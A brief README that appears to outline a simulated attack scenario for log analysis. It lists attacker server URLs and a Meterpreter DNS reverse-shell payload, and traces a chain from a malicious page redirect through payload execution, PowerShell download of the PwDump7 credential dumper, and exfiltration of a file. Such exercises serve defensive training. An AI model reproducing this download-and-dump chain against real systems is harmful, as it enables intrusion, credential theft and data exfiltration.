README

Server
http://159.203.64.71:3000/demos/basic.html  (Exploit kit like webpage)
http://159.203.64.71:81/c2dns.exe (malicious DNS payload)
http://159.203.64.71.81/PwDump7.exe (URI for PwDump7 download)

Attacker C2 -- 159.203.64.71:53
Payload used: Windows/Meterpreter/Reverse_tcp_dns

Victim
IP Address:
Hostname:
User: 

Scenario

Victim browses to http://159.203.64.71:3000/demos/basic.html
It gets redirected (302) to http://159.203.64.71:81/c2dns.exe
Victim executes c2dns.exe
Outbound TCP DNS 53 traffic to 159.203.64.71:53
loaded Powershell extension
use Invoke-webRequest -Uri "http://159.203.64.71.81/PwDump7.exe" 
PwDump7.exe downloaded by attacker into victim host
PwDump7.exe executed
Exfiltrated file: FILE.XLS 

LOGS ---- ------ --------- 
PAN TRAFFIC
PAN THREAT
PCAP 
AD SECURITY


